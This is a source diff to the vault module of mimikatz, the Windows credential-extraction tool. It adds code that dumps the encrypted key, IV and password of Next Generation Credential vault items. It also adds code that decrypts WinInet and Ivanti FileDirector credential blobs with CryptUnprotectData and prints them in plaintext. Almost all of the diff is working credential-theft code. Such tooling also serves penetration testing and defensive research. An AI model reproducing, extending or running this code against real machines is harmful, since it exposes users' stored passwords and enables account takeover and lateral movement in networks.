@@ -1,5 +1,5 @@
 /*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
+	https://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
@@ -61,7 +61,7 @@ const VAULT_SCHEMA_HELPER schemaHelper[] = {
 	{{{0xb2e033f5, 0x5fde, 0x450d, {0xa1, 0xbd, 0x37, 0x91, 0xf4, 0x65, 0x72, 0x0c}}, L"Pin Logon"},			kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric},
 	{{{0xb4b8a12b, 0x183d, 0x4908, {0x95, 0x59, 0xbd, 0x8b, 0xce, 0x72, 0xb5, 0x8a}}, L"Picture Password"},	kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric},
 	{{{0xfec87291, 0x14f6, 0x40b6, {0xbd, 0x98, 0x7f, 0xf2, 0x45, 0x98, 0x6b, 0x26}}, L"Biometric"},			kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric},
-	{{{0x1d4350a3, 0x330d, 0x4af9, {0xb3, 0xff, 0xa9, 0x27, 0xa4, 0x59, 0x98, 0xac}}, L"Next Generation Credential"},	NULL},
+	{{{0x1d4350a3, 0x330d, 0x4af9, {0xb3, 0xff, 0xa9, 0x27, 0xa4, 0x59, 0x98, 0xac}}, L"Next Generation Credential"},	kuhl_m_vault_list_descItem_ngc},
 };
 
 NTSTATUS kuhl_m_vault_list(int argc, wchar_t * argv[])
@@ -196,13 +196,13 @@ void CALLBACK kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric(co
 	if(enumItem8->Identity && (enumItem8->Identity->Type == ElementType_ByteArray))
 	{
 		kprintf(L"\t\tUser            : ");
+		kull_m_string_displaySID((PSID) enumItem8->Identity->data.ByteArray.Value);
 		if(kull_m_token_getNameDomainFromSID((PSID) enumItem8->Identity->data.ByteArray.Value, &name, &domain, NULL, NULL))
 		{
-			kprintf(L"%s\\%s", domain, name);
+			kprintf(L" (%s\\%s)", domain, name);
 			LocalFree(name);
 			LocalFree(domain);
 		}
-		else kull_m_string_displaySID((PSID) enumItem8->Identity->data.ByteArray.Value);
 		kprintf(L"\n");
 
 		if(pGuidString->guid.Data1 == 0x0b4b8a12b)
@@ -257,11 +257,11 @@ void CALLBACK kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric(co
 	{
 		switch(pGuidString->guid.Data1)
 		{
-		case 0x0b2e033f5:	// pin
+		case 0xb2e033f5:	// pin
 			if((enumItem8->Properties + 0)->Type == ElementType_UnsignedShort)
 				kprintf(L"\t\tPIN Code        : %04hu\n", (enumItem8->Properties + 0)->data.UnsignedShort);
 			break;
-		case 0x0b4b8a12b:	// picture
+		case 0xb4b8a12b:	// picture
 			if((enumItem8->Properties + 0)->Type == ElementType_ByteArray)
 			{
 				pElements = (PVAULT_PICTURE_PASSWORD_ELEMENT) (enumItem8->Properties + 0)->data.ByteArray.Value;
@@ -293,7 +293,7 @@ void CALLBACK kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric(co
 				}
 			}
 			break;
-		case 0x0fec87291:	// biometric
+		case 0xfec87291:	// biometric
 			if((enumItem8->Properties + 0)->Type == ElementType_ByteArray)
 			{
 				bElements = (PVAULT_BIOMETRIC_ELEMENT) (enumItem8->Properties + 0)->data.ByteArray.Value;
@@ -311,6 +311,41 @@ void CALLBACK kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric(co
 		}
 	}
 }
+
+void CALLBACK kuhl_m_vault_list_descItem_ngc(const VAULT_GUID_STRING * pGuidString, PVOID enumItem, PVOID getItem, BOOL is8)
+{
+	PVAULT_ITEM_8 enumItem8 = (PVAULT_ITEM_8) enumItem, getItem8 = (PVAULT_ITEM_8) getItem;
+	PWSTR name, domain;
+	PKIWI_NGC_CREDENTIAL pNgcCred;
+
+	if(enumItem8->Identity && (enumItem8->Identity->Type == ElementType_ByteArray))
+	{
+		kprintf(L"\t\tUser            : ");
+		kull_m_string_displaySID((PSID) enumItem8->Identity->data.ByteArray.Value);
+		if(kull_m_token_getNameDomainFromSID((PSID) enumItem8->Identity->data.ByteArray.Value, &name, &domain, NULL, NULL))
+		{
+			kprintf(L" (%s\\%s)", domain, name);
+			LocalFree(name);
+			LocalFree(domain);
+		}
+		kprintf(L"\n");
+	}
+
+	if(getItem8 && getItem8->Authenticator && (getItem8->Authenticator->Type == ElementType_ByteArray))
+	{
+		if(pNgcCred = (PKIWI_NGC_CREDENTIAL) getItem8->Authenticator->data.ByteArray.Value)
+		{
+			kprintf(L"\t\tEncKey          : ");
+			kull_m_string_wprintf_hex(pNgcCred->Data, pNgcCred->cbEncryptedKey, 0);
+			kprintf(L"\n\t\tIV              : ");
+			kull_m_string_wprintf_hex(pNgcCred->Data + pNgcCred->cbEncryptedKey, pNgcCred->cbIV, 0);
+			kprintf(L"\n\t\tEncPassword     : ");
+			kull_m_string_wprintf_hex(pNgcCred->Data + pNgcCred->cbEncryptedKey + pNgcCred->cbIV, pNgcCred->cbEncryptedPassword, 0);
+			kprintf(L"\n");
+		}
+	}
+}
+
 
 void kuhl_m_vault_list_descVault(HANDLE hVault)
 {
@@ -472,9 +507,7 @@ NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 						);
 					kprintf(L"Credential : ");
 					kull_m_string_printSuspectUnicodeString(pCredential[i]->CredentialBlob, pCredential[i]->CredentialBlobSize);
-					kprintf(L"\n"
-						L"Attributes : %u\n", pCredential[i]->AttributeCount
-						);
+					kprintf(L"\nAttributes : %u\n", pCredential[i]->AttributeCount);
 					if(kull_m_string_args_byName(argc, argv, L"attributes", NULL, NULL))
 					{
 						for(j = 0; j < pCredential[i]->AttributeCount; j++)
@@ -487,6 +520,7 @@ NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 							kprintf(L"\n");
 						}
 					}
+					kuhl_m_vault_cred_tryEncrypted(pCredential[i]);
 					kprintf(L"\n");
 				}
 				CredFree(pCredential);
@@ -495,4 +529,70 @@ NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 		} while((flags <= CRED_ENUMERATE_ALL_CREDENTIALS) && (MIMIKATZ_NT_MAJOR_VERSION > 5));
 	}
 	return STATUS_SUCCESS;
+}
+
+void kuhl_m_vault_cred_tryEncrypted(PCREDENTIAL pCredential)
+{
+	DATA_BLOB in, entropy, out;
+	PKULL_M_CRED_APPSENSE_DN pAppDN;
+	if(wcsstr(pCredential->TargetName, L"Microsoft_WinInet_"))
+	{
+		if(pCredential->CredentialBlobSize >= (DWORD) FIELD_OFFSET(KULL_M_DPAPI_BLOB, dwMasterKeyVersion))
+		{
+			if(RtlEqualGuid(pCredential->CredentialBlob + sizeof(DWORD), &KULL_M_DPAPI_GUID_PROVIDER))
+			{
+				in.cbData = pCredential->CredentialBlobSize;
+				in.pbData = pCredential->CredentialBlob;
+				entropy.cbData = sizeof(KULL_M_CRED_ENTROPY_CRED_DER);
+				entropy.pbData = (PBYTE) KULL_M_CRED_ENTROPY_CRED_DER;
+				if(CryptUnprotectData(&in, NULL, &entropy, NULL, NULL, 0, &out))
+				{
+					kprintf(L"   CredentialBlob: ");
+					kull_m_string_printSuspectUnicodeString(out.pbData, out.cbData);
+					kprintf(L"\n");
+					LocalFree(out.pbData);
+				}
+				else PRINT_ERROR_AUTO(L"CryptUnprotectData");
+			}
+		}
+	}
+	else if(wcsstr(pCredential->TargetName, L"AppSense_DataNow_"))
+	{
+		kprintf(L"* Ivanti FileDirector credential blob *\n");
+		if(pCredential->CredentialBlobSize >= (DWORD) FIELD_OFFSET(KULL_M_CRED_APPSENSE_DN, data))
+		{
+			pAppDN = (PKULL_M_CRED_APPSENSE_DN) pCredential->CredentialBlob;
+			if(!strcmp("AppN_DN_Win", pAppDN->type))
+			{
+				if(pAppDN->credBlobSize)
+				{
+					kprintf(L"Decrypting additional blob\n");
+					in.cbData = pAppDN->credBlobSize;
+					in.pbData = pAppDN->data;
+					if(CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
+					{
+						kprintf(L"   CredentialBlob: ");
+						kull_m_string_printSuspectUnicodeString(out.pbData, out.cbData);
+						kprintf(L"\n");
+						LocalFree(out.pbData);
+					}
+					else PRINT_ERROR_AUTO(L"CryptUnprotectData");
+				}
+				if(pAppDN->unkBlobSize)
+				{
+					kprintf(L"Decrypting additional blob\n");
+					in.cbData = pAppDN->unkBlobSize;
+					in.pbData = pAppDN->data + pAppDN->credBlobSize;
+					if(CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
+					{
+						kprintf(L"   UnkBlob       : ");
+						kull_m_string_printSuspectUnicodeString(out.pbData, out.cbData);
+						kprintf(L"\n");
+						LocalFree(out.pbData);
+					}
+					else PRINT_ERROR_AUTO(L"CryptUnprotectData");
+				}
+			}
+		}
+	}
 }
